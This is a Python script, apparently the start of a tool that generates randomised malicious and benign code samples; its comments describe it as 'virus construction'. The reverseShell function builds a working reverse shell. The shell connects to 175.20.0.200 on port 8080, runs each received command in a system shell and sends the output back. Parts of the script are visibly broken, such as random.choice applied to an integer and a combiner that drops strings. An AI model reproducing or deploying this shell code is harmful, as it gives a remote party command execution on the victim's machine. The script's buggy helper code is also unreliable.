import random

geneSequence = []
def unpacker(func):
    '''takes in a function that contains a list (up to a 2D aaray) 
    and then processes the list into a return string. Intended to 
    be used as a decorator.
    '''
    choices = func()
    # print(choices)
    global geneSequence
    return_string = ''
    geneArray = []
    try:
        for i in choices:
            if type(i) is list:
                var = int(random.randrange(len(i)) )
                return_string = return_string + str(i[var])
                geneArray.append(var)
            elif type(i) is str:
                return_string += i
        geneSequence.append(geneArray)
        return(return_string)
    except:
        print("Something went wrong!!")


def combiner(*args):
    choices = []
    for i in args:
        if type(i) == str:
            choices + [i]
        else:
            choices.extend(i)
    return(choices)


def random_good_imports():
    choices = [
        "import math",
        "import readline",
        "import re",
        "import difflib",
        "import textwrap",
        "import stringprep",
        "import datetime",
        "import array"
    ]
    r = random.choice(len(choices))
    return(random.choices(choices, k=r))


def random_bad_imports():
    choices = [
        "import zlib",
        "import gzip",
        "import bz2",
        "import lzma",
        "import zipfile",
        "import tarfile",
        "import hashlib",
        "import hmac",
        "import threading",
        "import crypt", 
    ]
    r = random.choice(len(choices))
    return(random.choices(choices, k=r))


def imports (good_bad_choice, requirements):
    for i in requirements:
        choices = requirements[i]
    return(choices)    


def infinite_loops():
    choices = [
        'while 1:\n',
        'for i in range(10000):\n',
        'while True:\n',
        'while 1 == 1:\n',
        'while 1 != 2:\n'
    ]
    return(random.choice(choices))


@unpacker
def reverseShell():
    required_imports = ['import socket\n', 'import subprocess\n']
    required_components = [
        's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n',
        's.connect(("175.20.0.200",8080))\n'
        ]
    required_nests = [
        '   command = s.recv(1024).decode("utf-8")\n',
        '   if not command: break\n',
        '   data = subprocess.check_output(command, shell=True)\n',
        '   s.send(data)\n'
        ]
    choices = combiner(
        required_imports, 
        required_components,
        infinite_loops(),
        required_nests
        )
    return(choices)


if __name__ == "__main__":    
    SAMPLE_SIZE = 1
    good_or_bad = ["good", "bad"]
    ### initially make a choice between making a good or bad file
    ### for the virus construction
    for i in good_or_bad: 
        for j in range(SAMPLE_SIZE):
            if i == "good":
                good_payloads = []  ## good payload choices
                #good_choices = random.choice(good_payloads)
            elif i == "bad":
                bad_payloads = []  ## bad payload choices
                #bad_choices = random.choice(bad_payloads) 
            else: 
                print("error: there is a problem with initialisation")


    ### now we've made a payload choice, construct the file based
    ### on the outcome of the choice. 

    list1 = [1, 2, 3, 4, 5]
    list2 = ['funcky', 'b', 'c', 'd'] 
    print(reverseShell)
    # print(random_good_imports())